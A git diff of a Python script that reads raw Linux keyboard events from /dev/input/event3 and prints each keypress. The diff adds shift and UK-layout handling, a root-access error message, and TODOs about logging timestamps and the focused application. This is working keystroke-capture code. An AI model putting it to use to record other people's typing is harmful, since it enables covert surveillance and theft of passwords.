@@ -14,29 +14,40 @@ NOTE: Read from /dev/input/event3
 values for timeval, type, code and value are located in /usr/include/linux/input-event-codes.h
 """
 
+#TODO: Look into the xlib module
+
+#TODO: When recording keystrokes add date/time of keystrokes and also the application that
+#      is currrently in focus
 #TODO: Change value when there is shift combinatins, i.e 1 to !,
 #      also figure out how to do this over multiple keyboard layouts
 #TODO: Ensure works with different keyboard layouts, not just qwerty
 
-'Goes through /usr/include/linux/input-event-codes.h getting key codes'
+#NOTE: 'input-event-codes' are american layout
+
+'Goes through input-event-codes.h getting key codes'
 def parse_input_event_codes():
     f = open("/usr/include/linux/input-event-codes.h", "r")
-    data = f.readlines()
+    f_data = f.readlines()
     f.close()
 
-    key_const = {}
+    key_consts = {}
 
-    for i in data:
-        c = [x for x in i.replace("\t", " ").replace("\n", "").split(" ") if x]
-        if len(c) < 3 or (c[1][:3] != "KEY" and c[1][:3] != "BTN"): continue
-        val = c[2] if "0x" not in c[2] else str(int(c[2], 16))
-        if "+" in val:
-            v = val[1:-1].split("+")
-            val = int(key_const[v[0]]) + int(v[1])
-        elif val in key_const:
-            val = key_const[val]
-        key_const[c[1]] = val
-    return {key_const[x]:x for x in key_const}
+    #parse data obtaining intial key-codes
+    for line in f_data:
+        if line[:11] != "#define KEY" and line[:11] != "#define BTN": continue
+
+        #gets key code/value from constant
+        const = re.sub(r"#define |[\n()]", "", line).replace("\t", " ").split(" ")
+        const = [x for x in const if x]
+        value, code = const[0], const[1]
+
+        #converts code to int, leaves ref consts as strings ad it cant convert it to same value as another
+        #constant because values are used as dict keys
+        if code[:2] == "0x": code = int(code, 16)
+        elif "_" not in code: code = int(code)
+        key_consts[str(code)] = value
+
+    return key_consts
 
 def get_capsnum_lock():
     ps_res = subprocess.run(["xset", "-q"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -45,15 +56,19 @@ def get_capsnum_lock():
     return [res[2], res[4]]
 
 def main():
-    f = open("/dev/input/event3", "rb")
     form = "llHHI"
     e_size = struct.calcsize(form)
     key_butn_const = parse_input_event_codes()
     ctrl_shift = [0, 0]
     caps_num_lock = get_capsnum_lock()
     alph = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    combinations = ')!"£$%^&*('
+    uk_combinations = {str(x):combinations[x] for x in range(10)}
+    uk_combinations["MINUS"] = "_"
+    uk_combinations["EQUAL"] = "+"
 
     try:
+        f = open("/dev/input/event3", "rb")
         e = f.read(e_size)
         while e:
             caps_num_lock = get_capsnum_lock()
@@ -71,12 +86,20 @@ def main():
                     key = key.lower()
 
                 key = "CTRL_" + key if ctrl_shift[0] else key
+                if ctrl_shift[1] and not ctrl_shift[0] and key.upper() not in alph:
+                    try:
+                        key = uk_combinations[key.split("_")[-1]]
+                    except KeyError:
+                        key = "SHIFT_" + key
+
                 if value_ == 1 or value_ == 2:
                     print("KEY: {}".format(key))
 
             e = f.read(e_size)
+    except (FileNotFoundError, PermissionError):
+        raise Exception("Unable to access file required to read raw data, please ensure the file exists and that you have root access.")
     except KeyboardInterrupt: pass
-    finally: f.close()
+    finally:f.close()
 
 if __name__ == '__main__':
     main()
